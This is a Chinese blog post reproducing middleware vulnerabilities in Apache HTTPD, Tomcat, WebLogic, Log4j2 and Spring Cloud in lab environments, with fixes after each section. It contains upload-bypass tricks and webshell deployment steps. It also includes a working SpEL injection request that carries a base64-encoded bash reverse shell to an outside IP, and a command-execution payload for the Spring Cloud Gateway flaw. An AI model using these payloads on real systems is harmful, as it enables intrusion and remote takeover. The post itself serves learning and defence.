<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Web常见中间件复现 - 秋秋晚</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="秋秋晚"><meta name="msapplication-TileImage" content="https://tva1.sinaimg.cn/large/e6c9d24egy1h23f8ujgnpj208c08ca9x.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="秋秋晚"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="记录自己复现中间件漏洞的一点记录"><meta property="og:type" content="blog"><meta property="og:title" content="秋秋晚"><meta property="og:url" content="https://lhxhl.github.io/"><meta property="og:site_name" content="秋秋晚"><meta property="og:description" content="记录自己复现中间件漏洞的一点记录"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://tva1.sinaimg.cn/large/e6c9d24egy1h23g1fyyodj20jg0jgwfd.jpg"><meta property="article:published_time" content="2022-06-10T15:03:46.643Z"><meta property="article:modified_time" content="2022-09-07T13:48:54.634Z"><meta property="article:author" content="秋秋晚"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://tva1.sinaimg.cn/large/e6c9d24egy1h23g1fyyodj20jg0jgwfd.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://lhxhl.github.io/2022/06/10/vul/"},"headline":"秋秋晚","image":["https://tva1.sinaimg.cn/large/e6c9d24egy1h33jrgskpfj21c50u0ajy.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h33jtc6rvzj218p0u042q.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h33k8w7xrfj21cr0u0aex.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h349z1i5zzj21mk0b8q8p.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34a0vm0sjj21cy0h0tbv.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34abs3cjfj21e20u0qd4.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34aemodx2j21ga0jsn1l.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34af5djzgj216m0u042x.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34aqvsreyj21es0u0wl2.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34avompavj21b205umxn.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34azx7td5j211e06gmyg.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34b112krkj21ee0akwi4.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34b25mvbgj216s0mq0v5.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h34djgtrz1j21ag0t8jxh.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35a5dvd0tj21v00hagpt.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35a8sjrbvj21jg098tb9.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35aj0x8h2j213y0c6gnq.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35ajdf28lj20mg09mjrv.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35ebiso4qj22550u0asp.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35r1cwiw5j21qq0j4jv6.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35r2gueiqj215s0gitbb.jpg","https://tva1.sinaimg.cn/large/e6c9d24egy1h35s4avoehj217w0cqgnl.jpg"],"datePublished":"2022-06-10T15:03:46.643Z","dateModified":"2022-09-07T13:48:54.634Z","author":{"@type":"Person","name":"秋秋晚"},"description":"记录自己复现中间件漏洞的一点记录"}</script><link rel="canonical" href="https://lhxhl.github.io/2022/06/10/vul/"><link rel="icon" href="https://tva1.sinaimg.cn/large/e6c9d24egy1h23f8ujgnpj208c08ca9x.jpg"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">秋秋晚</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-06-10  <a class="commentCountImg" href="/2022/06/10/vul/#comment-container"><span class="display-none-class">1b58be0a0c471a397a7871bb70a89235</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="1b58be0a0c471a397a7871bb70a89235">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>19 分钟  <i class="fas fa-pencil-alt"> </i>2.8 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">Web常见中间件复现</h1><div class="content"><p><strong>记录自己复现中间件漏洞的一点记录</strong></p>
<span id="more"></span>

<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</strong></p>
<p><strong>上传一个1.php的文件，然后burp抓包可以修改，在1.php后插入一个0a</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h33jrgskpfj21c50u0ajy.jpg"></p>
<p><strong>便可以成功上传，再访问1.php%0a，就可以执行了php文件</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h33jtc6rvzj218p0u042q.jpg"></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul>
<li><strong>升级到最新版本</strong></li>
<li><strong>对上传文件重命名</strong></li>
<li><strong>禁用上传文件的执行权限</strong></li>
</ul>
<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p><strong>Apache文件解析漏洞涉及到一个解析文件的特性：</strong></p>
<p><strong>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy</strong></p>
<p><strong>若给<code>.php</code>后缀增加了处理器：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure>

<p><strong>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h33k8w7xrfj21cr0u0aex.jpg"></p>
<h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p><strong>将AddHandler application/x-httpd-php .php的配置文件删除。</strong></p>
<p><strong>利用正则表达式</strong><br><strong>1、使用SetHandler,写好正则</strong></p>
<p><strong>&lt;FileMatch “.+.php$”&gt;</strong></p>
<p><strong>SetHandler application/x-httpd-php</strong></p>
<p><strong>2、禁止.php这样的文件执行</strong></p>
<p><strong>&lt;FileMatch “.+.ph(p[3457]?|t|tml).”&gt;</strong></p>
<p><strong>Require all denied</strong></p>
<h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p><strong>由于配置不当（非默认配置），将配置文件<code>conf/web.xml</code>中的<code>readonly</code>设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传</strong></p>
<p><strong>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码</strong></p>
<p><strong>通过阅读 conf/web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控</strong></p>
<p><strong>搭建好环境后可以，进入docker的shell里查看一下</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h349z1i5zzj21mk0b8q8p.jpg"></p>
<p><strong>可以看到<code>readonly</code>是<code>false</code>，抓个包，改为PUT看能否写入一个文件</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34a0vm0sjj21cy0h0tbv.jpg"></p>
<p><strong>状态码是201，应该是写入成功</strong></p>
<p><strong>于是我们就可以写入一个jsp木🐎，用蚁剑生成一下，但是直接传，发现会报404，应该是对jsp有限制</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34abs3cjfj21e20u0qd4.jpg"></p>
<p><strong>绕过方式有三种</strong></p>
<ul>
<li><strong>Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格</strong>  </li>
<li><strong>Windows NTFS流Put/a001.jsp::$DATA HTTP/1.1</strong></li>
<li><strong>/在文件名中是非法的，也会被去除（Linux/Windows）Put/a001.jsp/http:/1.1</strong>  </li>
</ul>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34aemodx2j21ga0jsn1l.jpg"></p>
<p><strong>便可以上传成功</strong></p>
<p>拿到shell</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34af5djzgj216m0u042x.jpg"></p>
<h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p><strong>检测当前版本是否在影响范围内，并禁用PUT方法。</strong></p>
<p><strong>更新并升级至最新版。</strong></p>
<p><strong>最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞。</strong></p>
<h1 id="Tomcat7-弱口令-amp-amp-后台war文件getshell漏洞"><a href="#Tomcat7-弱口令-amp-amp-后台war文件getshell漏洞" class="headerlink" title="Tomcat7+ 弱口令 &amp;&amp; 后台war文件getshell漏洞"></a>Tomcat7+ 弱口令 &amp;&amp; 后台war文件getshell漏洞</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p><strong>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</strong></p>
<p><strong>若后台管理页面存在弱口令，则可以通过爆破获取密码。</strong></p>
<p><strong>启动环境后，访问<code>/manage/html</code>可以认证登录</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34aqvsreyj21es0u0wl2.jpg"></p>
<p><strong>经过base64编码，可以爆破弱口令，登录后，在这里可以看到有上传war包的地方</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34avompavj21b205umxn.jpg"></p>
<p><strong>生成jsp🐎后，用jar打包成war文件</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34azx7td5j211e06gmyg.jpg"></p>
<p><strong>上传成功，访问200，应该没问题</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34b112krkj21ee0akwi4.jpg"></p>
<p>拿到shell</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34b25mvbgj216s0mq0v5.jpg"></p>
<h2 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h2><ul>
<li><strong>在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</strong></li>
<li><strong>增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</strong></li>
<li><strong>以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</strong></li>
<li><strong>后台管理避免弱口令。</strong></li>
</ul>
<h1 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h1><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h34djgtrz1j21ag0t8jxh.jpg"></p>
<p><strong><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/CVE-2018-2628/">复现</a></strong></p>
<h2 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h2><p><strong>打补丁</strong></p>
<p><strong>在绝⼤多数应⽤的使⽤场景中，⽤户只需要在公⽹能够使⽤HTTP(S)协议访问web应⽤服务器即可。</strong></p>
<p><strong>对于weblogic服务器，在绝⼤多数情况下，只需要能够在公⽹访问weblogic提供的HTTP(S)协议的服务即可，并不需要访问T3协议。</strong><br><strong>少数情况下，运维⼈员需要使⽤weblogic的T3协议：</strong></p>
<ul>
<li><strong>在weblogic服务器本机执⾏weblogic的停⽌脚本；</strong></li>
<li><strong>通过WLST对weblogic进⾏脚本化配置；</strong></li>
<li><strong>编写使⽤T3协议通信的程序对weblogic进⾏状态监控及其他管理功能。</strong></li>
</ul>
<p><strong>T3协议与HTTP协议均基于TCP协议，T3协议以”t3″开头，HTTP协议以“GET”、“POST”等开头，两者有明显的区别。</strong><br><strong>因此可以限定只允许特定服务器访问weblogic服务器的T3协议，能够修复weblogic的JAVA反序列化漏洞。即使今后发现了weblogic的其他类存在JAVA反序列化漏洞，也能够防护</strong></p>
<h1 id="Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228"><a href="#Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228" class="headerlink" title="Apache Log4j2 lookup JNDI 注入漏洞(CVE-2021-44228)"></a>Apache Log4j2 lookup JNDI 注入漏洞(CVE-2021-44228)</h1><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p><strong>Apache Log4j是一个基于Java的日志记录组件，通过重写Log4j引入了丰富的功能特性，该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。</strong></p>
<p><strong>主要由于它log4j2提供了lookup的功能</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35a5dvd0tj21v00hagpt.jpg"></p>
<p><strong>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。</strong></p>
<p><strong>常见的解析有：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;ctx:loginId&#125;</span><br><span class="line">$&#123;map:type&#125;</span><br><span class="line">$&#123;filename&#125;</span><br><span class="line">$&#123;date:MM-dd-yyyy&#125;</span><br><span class="line">$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;</span><br><span class="line">$&#123;docker:imageName&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;event:Marker&#125;</span><br><span class="line">$&#123;mdc:UserId&#125;</span><br><span class="line">$&#123;java&#125;</span><br><span class="line">$&#123;jndi:logging/context-name&#125;</span><br><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;k8s&#125;</span><br><span class="line">$&#123;log4j&#125;</span><br><span class="line">$&#123;main&#125;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">$&#123;marker&#125;</span><br><span class="line">$&#123;spring&#125;</span><br><span class="line">$&#123;sys:logPath&#125;</span><br><span class="line">$&#123;web:rootDir&#125;</span><br></pre></td></tr></table></figure>

<p><strong>除了这个解析，还有涉及到一个jndi注入</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35a8sjrbvj21jg098tb9.jpg"></p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>启动环境后，我们在管理员接口的<code>action</code>参数处进行漏洞利用</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35aj0x8h2j213y0c6gnq.jpg"></p>
<p>在dns平台可以收到回显</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35ajdf28lj20mg09mjrv.jpg"></p>
<p><strong>进一步利用可以运用这两个工具</strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/su18/JNDI">JNDI 注入利用工具</a></strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/sayers522/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></strong></p>
<p>利用如下</p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35ebiso4qj22550u0asp.jpg"></p>
<h2 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h2><ul>
<li><strong>Apache官方已发布新版本完成漏洞修复，建议及时升级至最新版本</strong></li>
<li><strong>添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true</strong></li>
<li><strong>在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</strong></li>
<li><strong>JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；</strong></li>
<li><strong>部署使用第三方防火墙产品进行安全防护。</strong></li>
</ul>
<h1 id="Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）"><a href="#Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）" class="headerlink" title="Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）"></a>Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</h1><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p><strong>Spring Cloud Function将请求头中的“spring.cloud.function.routing-expression”参数作为 SpEL表达式进行处理，造成SpEL表达式注入漏洞，成功利用此漏洞可实现任意代码执行。</strong></p>
<h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p><strong>发送如下请求包</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/functionRouter</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.58.236.76</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyMS40MS4xMjIuNzMvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-bash"><span class="built_in">test</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35r1cwiw5j21qq0j4jv6.jpg"></p>
<p><strong>等待一会在vps上得到回连</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35r2gueiqj215s0gitbb.jpg"></p>
<h2 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h2><p><strong>根据业务情况，更新版本修复</strong></p>
<h1 id="Spring-Cloud-Gateway-Actuator-API-SpEL-Code-Injection-CVE-2022-22947"><a href="#Spring-Cloud-Gateway-Actuator-API-SpEL-Code-Injection-CVE-2022-22947" class="headerlink" title="Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)"></a>Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)</h1><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p><strong>Spring cloud GateWay的actuator相关端点：</strong></p>
<ul>
<li><strong>获取所有路由：Get请求：<a href="http://localhost:xxxx/actuator/gateway/routes/">http://localhost:xxxx/actuator/gateway/routes/</a></strong></li>
<li><strong>添加路由：POST请求：<a href="http://localhost:xxxx/actuator/gateway/routes/路由编号">http://localhost:xxxx/actuator/gateway/routes/路由编号</a></strong></li>
<li><strong>删除路由：DELETE请求：<a href="http://localhost:xxxx/actuator/gateway/routes/路由编号">http://localhost:xxxx/actuator/gateway/routes/路由编号</a></strong></li>
<li><strong>获取指定路由：GET请求：<a href="http://localhost:xxxx/actuator/gateway/routes/路由编号">http://localhost:xxxx/actuator/gateway/routes/路由编号</a></strong></li>
<li><strong>刷新路由：POST请求：<a href="http://localhost:xxxx/actuator/gateway/refresh">http://localhost:xxxx/actuator/gateway/refresh</a></strong></li>
</ul>
<p><strong>其中，调用添加路由的端点时，可以向路由中加入<code>filters</code>，过滤器的值允许为spEL表达式，且会解析这个spEL表达式。可以通过构造spEL进行远程命令执行。构造的<code>filters</code>可以直接利用gateway自带的<code>AddResponseHeader</code>，将spEL的执行结果添加到响应头中，直接通过响应头进行查看。</strong></p>
<h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><p><strong>第一个请求，发送恶意的SpEL表达式的路由</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/qqw</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.58.236.76:49135</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>361</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;id&quot;</span>: <span class="string">&quot;qqw&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">        <span class="string">&quot;args&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> java.lang.<span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span>&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">        &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">      &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">      &quot;</span>order<span class="string">&quot;: 0</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>第二个请求刷新</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.58.236.76:49135</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>然后访问，之前恶意请求的路由，可以看到已经执行了命令</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h35s4avoehj217w0cqgnl.jpg"></p>
<h2 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h2><ul>
<li><ol>
<li><strong>如果不需要Actuator，可以通过management.endpoint.gateway.enable：false配置将其禁用。</strong></li>
</ol>
</li>
<li><ol start="2">
<li><strong>如果需要Actuator，则应使用Spring Security对其进行保护。</strong></li>
</ol>
</li>
<li><ol start="3">
<li><strong>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。</strong></li>
</ol>
</li>
</ul>
</div><div class="article-licensing box"><div class="licensing-title"><p>Web常见中间件复现</p><p><a href="https://lhxhl.github.io/2022/06/10/vul/">https://lhxhl.github.io/2022/06/10/vul/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="https://lhxhl.github.io"><p>秋秋晚</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-06-10</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-09-07</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab 